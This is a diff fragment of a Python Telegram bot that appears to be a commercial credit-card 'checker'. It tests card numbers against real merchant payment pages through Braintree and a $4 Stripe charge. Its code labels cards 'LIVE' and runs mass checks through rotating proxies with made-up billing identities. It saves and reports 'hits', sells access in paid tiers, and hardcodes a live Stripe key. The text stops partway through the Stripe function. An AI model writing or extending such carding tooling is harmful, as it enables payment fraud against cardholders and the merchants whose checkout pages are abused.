+            'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user_agent,
+        }
+        
+        add_payment_data = [
+            ('payment_method', 'braintree_credit_card'),
+            ('wc-braintree-credit-card-card-type', card_brand),
+            ('wc-braintree-credit-card-3d-secure-enabled', ''),
+            ('wc-braintree-credit-card-3d-secure-verified', ''),
+            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+            ('wc_braintree_credit_card_payment_nonce', token),
+            ('wc_braintree_device_data', '{}'),
+            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+            ('wc_braintree_paypal_payment_nonce', ''),
+            ('wc_braintree_paypal_amount', '0.00'),
+            ('wc_braintree_paypal_currency', 'USD'),
+            ('wc_braintree_paypal_locale', 'en_us'),
+            ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+            ('woocommerce-add-payment-method-nonce', payment_nonce),
+            ('_wp_http_referer', '/my-account/add-payment-method/'),
+            ('woocommerce_add_payment_method', '1'),
+        ]
+        
+        response = session.post(
+            BRAINTREE_AUTH_ADD_PAYMENT,
+            cookies=session.cookies,
+            headers=add_payment_headers,
+            data=add_payment_data,
+            timeout=30
+        )
+        
+        elapsed = time.time() - start_time
+        
+        # ============ STEP 8: Parse Result ============
+        print(f"\n📥 Payment Result Status: {response.status_code}")
+        
+        # Check for success
+        if "Payment method successfully added" in response.text:
+            print(f"\n✅✅✅ PAYMENT METHOD ADDED! Card is LIVE ✅✅✅")
+            return {
+                "status": "success",
+                "result": "APPROVED",
+                "message": "Payment method successfully added - Card is LIVE",
+                "status_display": "✅ APPROVED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": "$0.00",
+                "gateway": "Braintree Auth",
+                "token": token[:20] + "..."
+            }
+        
+        # Check for error messages
+        error_match = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response.text, re.DOTALL)
+        if error_match:
+            error_text = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
+            print(f"❌ Error: {error_text}")
+            
+            # Parse error
+            error_lower = error_text.lower()
+            if "insufficient" in error_lower or "funds" in error_lower:
+                return {
+                    "status": "success",
+                    "result": "INSUFFICIENT_FUNDS",
+                    "message": f"Insufficient funds: {error_text}",
+                    "status_display": "💰 INSUFFICIENT FUNDS",
+                    "status_category": "approved",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "Braintree Auth"
+                }
+            elif "cvv" in error_lower or "security" in error_lower:
+                return {
+                    "status": "success",
+                    "result": "CVV_LIVE",
+                    "message": f"CVV verification failed: {error_text}",
+                    "status_display": "✅ CVV LIVE",
+                    "status_category": "approved",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "Braintree Auth"
+                }
+            elif "declined" in error_lower:
+                return {
+                    "status": "declined",
+                    "result": "DECLINED",
+                    "message": f"Card declined: {error_text}",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "Braintree Auth"
+                }
+            elif "expired" in error_lower:
+                return {
+                    "status": "declined",
+                    "result": "EXPIRED",
+                    "message": f"Expired card: {error_text}",
+                    "status_display": "❌ EXPIRED",
+                    "status_category": "declined",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "Braintree Auth"
+                }
+            elif "3d" in error_lower or "secure" in error_lower:
+                return {
+                    "status": "declined",
+                    "result": "3DS_REQUIRED",
+                    "message": f"3D Secure required: {error_text}",
+                    "status_display": "🔐 3DS REQUIRED",
+                    "status_category": "approved",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "Braintree Auth"
+                }
+            else:
+                return {
+                    "status": "declined",
+                    "result": "DECLINED",
+                    "message": error_text,
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "Braintree Auth"
+                }
+        
+        # Check for success indicators in response
+        if "success" in response.text.lower() and "error" not in response.text.lower():
+            print(f"\n✅✅✅ PAYMENT METHOD ADDED! Card is LIVE ✅✅✅")
+            return {
+                "status": "success",
+                "result": "APPROVED",
+                "message": "Payment method successfully added",
+                "status_display": "✅ APPROVED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": "$0.00",
+                "gateway": "Braintree Auth"
+            }
+        
+        # Default: declined
+        print("❌ Card declined - Unknown reason")
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": "Card declined",
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "Braintree Auth"
+        }
+        
+    except requests.Timeout:
+        print(f"⏰ Request timeout")
+        default_result["message"] = "Request timeout"
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+    except requests.ConnectionError as e:
+        print(f"❌ Connection error: {e}")
+        default_result["message"] = f"Connection error: {str(e)[:50]}"
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        default_result["message"] = str(e)[:100]
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+
+
+def format_braintree_auth_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Braintree Auth response for display"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Braintree Auth")
+    price = result.get("price", "$0.00")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:80]
+    if len(message) > 80:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+    
+    return ui, status_category
+
+
+# ============ BRAINTREE AUTH SINGLE CHECK ============
+
+@check_gateway("braintree_auth")
+async def single_check_braintree_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Braintree Auth gateway - /b3 <card>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Braintree Auth Gateway</b>\n\n"
+            "Usage: <code>/b3 &lt;card&gt;</code>\n"
+            "Example: <code>/b3 4111111111111111|12|2028|123</code>\n\n"
+            "💰 Amount: $0.00 (Payment Method Addition)\n"
+            "📍 Gateway: Braintree via DNA Lasering\n"
+            "✅ Checks: CVV Live, 3DS, Insufficient Funds",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2028|123"
+        )
+        return
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'braintree'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>Braintree Auth not available for {tier.upper()} tier</b>\n\n"
+            f"Upgrade to Premium/Ultimate to use this gateway.",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+        return
+    
+    braintree_auth_active_tasks[user_id] = True
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+        
+        status_msg = await message.reply_text("🔄 Checking card with Braintree Auth...")
+        
+        await speed_controller.wait_if_needed()
+        start = time.time()
+        
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [Braintree Auth] Using proxy: {mask_proxy(proxy_str)}")
+        
+        result = await check_card_braintree_auth(card, proxy_str, user_id)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+        
+        bin_info = await get_bin_info(card)
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        
+        ui, status_category = format_braintree_auth_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+        
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="Braintree Auth",
+                response=result.get("message", "Approved"),
+                price="$0.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Braintree Auth", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$0.00",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+        # Show remaining credits for free users
+        if user_manager.get_tier(user_id) == 'free':
+            remaining = get_user_credits(user_id)
+            await message.reply_text(
+                f"💎 <b>Credits Remaining: {remaining}</b>\n"
+                f"Use /credits to check balance.",
+                parse_mode=ParseMode.HTML
+            )
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Braintree Auth] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        braintree_auth_active_tasks.pop(user_id, None)
+
+
+# ============ BRAINTREE AUTH MASS CHECK ============
+
+@check_gateway("braintree_auth")
+async def mass_check_braintree_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Braintree Auth gateway - /mb3 <cards>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    if not user_manager.can_access_gateway(user_id, 'braintree'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Braintree Auth not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /b3 for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+                
+            await message.delete()
+            await braintree_auth_mass_check_logic(update, context, cards, None)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Braintree Auth Mass Check</b>\n\n"
+            "Usage: <code>/mb3 &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mb3\n\n"
+            "Example: <code>/mb3 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $0.00 (Payment Method Addition)\n"
+            "📍 Gateway: Braintree via DNA Lasering\n"
+            "✅ Only approved cards will be shown\n"
+            "❌ Declined cards are hidden from chat",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check (1 credit per card for free users)
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await braintree_auth_mass_check_logic(update, context, cards, None)
+
+
+async def braintree_auth_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for Braintree Auth gateway"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [BRAINTREE AUTH MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+    
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+    
+    stats = {
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+    
+    start_time = time.time()
+    proxy_index = 0
+    
+    try:
+        braintree_auth_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        # Process 5 cards at a time (Braintree is slower)
+        CONCURRENCY = 5
+        BATCH_SIZE = 5
+        
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ Braintree Auth\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 5 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ Braintree Auth\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except Exception as e:
+                if "message is not modified" not in str(e).lower():
+                    print(f"⚠️ Progress update error: {e}")
+        
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+            
+            async with semaphore:
+                # Get proxy for this card
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                
+                await speed_controller.wait_if_needed()
+                start = time.time()
+                result = await check_card_braintree_auth(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+                
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED] {card[:20]}...")
+                    else:
+                        stats["declined"] += 1
+                        print(f"⚠️ [ERROR - DECLINED] {card[:20]}...")
+                    
+                    if processed_count % 5 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                # Only send approved cards
+                if status_category == "approved":
+                    ui, _ = format_braintree_auth_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except Exception as e:
+                        print(f"❌ Error sending result: {e}")
+                    
+                    await save_hit_to_file(
+                        card=card, gateway="Braintree Auth",
+                        response=result.get("message", "Approved"),
+                        price="$0.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+                    
+                    user_data = user_manager.get_user(u_id)
+                    await send_hit_notification(
+                        context=context, gateway="Braintree Auth", card=card,
+                        response=result.get("message", "Approved"),
+                        price="$0.00",
+                        user=user_data, bin_info=bin_info, status_category="approved"
+                    )
+                    user_manager.increment_hits(u_id)
+                
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+        
+        # Process cards in batches
+        for batch_start in range(0, total, BATCH_SIZE):
+            if u_id not in braintree_auth_active_tasks:
+                break
+            
+            batch_end = min(batch_start + BATCH_SIZE, total)
+            batch_cards = cards[batch_start:batch_end]
+            
+            tasks = []
+            for idx, card in enumerate(batch_cards, batch_start):
+                task = asyncio.create_task(process_single_card(card, idx))
+                tasks.append(task)
+            
+            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            for result in batch_results:
+                if isinstance(result, Exception):
+                    print(f"❌ Batch task error: {result}")
+                    async with stats_lock:
+                        stats["declined"] += 1
+                        stats["processed"] += 1
+            
+            # Small delay between batches
+            if batch_end < total:
+                await asyncio.sleep(0.5)
+        
+        # Final summary
+        if u_id in braintree_auth_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+            
+            summary = (
+                f"{skull_emoji} <b>Braintree Auth Mass Check Complete</b>\n\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ 0\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ Braintree Auth mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+            else:
+                await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        braintree_auth_active_tasks.pop(u_id, None)
+        print(f"🏁 [Braintree Auth Mass] Session ended for user {u_id}")
 
 # ============ SHOPIFY SINGLE CHECK GATEWAY (AUTOSOPI MAIN API) ============
 
@@ -32287,6 +34498,985 @@ async def mass_check_razorpay_gate2_command(update: Update, context: ContextType
     await razorpay_gate2_mass_check_logic(update, context, cards, None)
     
     
+    
+# ============ STRIPE 4 USD GATEWAY (ALFAN.LINK) ============
+# Add this to your f13.py
+
+import requests
+import re
+import json
+import time
+import random
+import base64
+import hashlib
+import uuid
+import asyncio
+import traceback
+from bs4 import BeautifulSoup
+from faker import Faker
+from user_agent import generate_user_agent
+from typing import Dict, Tuple, Optional, List
+
+# Active tasks for Stripe 4 USD
+stripe_4usd_active_tasks = {}
+
+# ============ STRIPE 4 USD CONFIG ============
+STRIPE_4USD_LINK_ID = "a1717225-65a6-453d-9fd1-88105f6b98a3"
+STRIPE_4USD_AMOUNT = 400  # $4.00 in cents
+STRIPE_4USD_CURRENCY = "usd"
+STRIPE_4USD_COUNTRY = "FR"
+STRIPE_4USD_STRIPE_KEY = "pk_live_51KqEwKAg5UWiBn5yZ9tQb5Uy4Wy58k74q6hT7nXuxLoQeAiD8P8JEUhDZDgvDQxvFITX9sj4dRz4Tud1r1vvhxOC00M5fToUYy"
+STRIPE_4USD_API_URL = "https://backend.al.fan/finance/api/stripe/paymentIntent"
+
+def generate_4usd_data():
+    """Generate fake user data for Stripe 4 USD"""
+    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
+    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
+    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
+    
+    f = random.choice(fnames)
+    l = random.choice(lnames)
+    num = random.randint(10, 999)
+    email = f"{f}.{l}{num}@{random.choice(domains)}"
+    name = f"{f.capitalize()} {l.capitalize()}"
+    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
+    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
+    zip_code = str(random.randint(10000, 99999))
+    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
+    return email, name, add, city, zip_code, phone
+
+async def check_card_stripe_4usd(card: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
+    """
+    Check card using Stripe 4 USD gateway (alfan.link)
+    Charges $4.00 USD per check
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [STRIPE 4 USD] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    else:
+        print(f"🔌 No proxy - direct connection")
+    if retry_count > 0:
+        print(f"🔄 RETRY ATTEMPT #{retry_count}")
+    print(f"{'='*80}")
+    
+    default_result = {
+        "status": "error",
+        "result": "UNKNOWN_ERROR",
+        "message": "Unknown error occurred",
+        "status_display": "⚠️ ERROR",
+        "status_category": "error",
+        "elapsed": 0,
+        "price": "$4.00",
+        "gateway": "Stripe 4 USD"
+    }
+    
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error"
+            }
+        
+        cc, mm, yy, cvv = parts
+        
+        # Format year (API expects 2-digit)
+        if len(yy) == 4:
+            yy = yy[2:]
+        
+        # Generate user data
+        email, name, add, city, zip_code, phone = generate_4usd_data()
+        print(f"👤 User: {name} | 📧 {email} | 📞 {phone}")
+        
+        # Setup session with proxy
+        session = requests.Session()
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                session.proxies = {'http': proxy_url, 'https': proxy_url}
+                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
+        
+        start_time = time.time()
+        user_agent = generate_user_agent()
+        
+        # ============ STEP 1: Get Client Secret ============
+        print(f"\n📡 [STEP 1] Getting client secret...")
+        
+        headers = {
+            'authority': 'backend.al.fan',
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/json',
+            'origin': 'https://alfan.link',
+            'platform_type': 'Web',
+            'referer': 'https://alfan.link/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'cross-site',
+            'user-agent': user_agent,
+            'x-api-version': '2026-03-09',
+        }
+        
+        json_data = {
+            'linkId': STRIPE_4USD_LINK_ID,
+            'currency': STRIPE_4USD_CURRENCY,
+            'amount': STRIPE_4USD_AMOUNT,
+            'productType': 'Link',
+            'sectionItemPriceValue': 'default',
+            'countryCode': STRIPE_4USD_COUNTRY,
+        }
+        
+        response = session.post(
+            STRIPE_4USD_API_URL,
+            headers=headers,
+            json=json_data,
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print(f"❌ Failed to get client secret: HTTP {response.status_code}")
+            print(f"Response: {response.text[:200]}")
+            default_result["message"] = f"Failed to get client secret: HTTP {response.status_code}"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        try:
+            result = response.json()
+            client_secret = result.get('clientSecret')
+            if not client_secret:
+                print("❌ No client secret in response")
+                default_result["message"] = "No client secret in response"
+                default_result["elapsed"] = time.time() - start_time
+                return default_result
+        except json.JSONDecodeError as e:
+            print(f"❌ JSON parse error: {e}")
+            default_result["message"] = "Invalid JSON response"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        # Extract payment intent ID
+        pi_id = client_secret.split('_secret')[0]
+        print(f"✅ Client secret: {client_secret[:30]}...")
+        print(f"✅ Payment Intent ID: {pi_id}")
+        
+        # ============ STEP 2: Create Payment Method ============
+        print(f"\n📡 [STEP 2] Creating payment method...")
+        
+        headers_pm = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user_agent,
+        }
+        
+        pm_data = {
+            'type': 'card',
+            'billing_details[name]': name,
+            'billing_details[email]': email,
+            'billing_details[phone]': phone,
+            'billing_details[address][line1]': add,
+            'billing_details[address][city]': city,
+            'billing_details[address][postal_code]': zip_code,
+            'billing_details[address][country]': 'US',
+            'card[number]': cc,
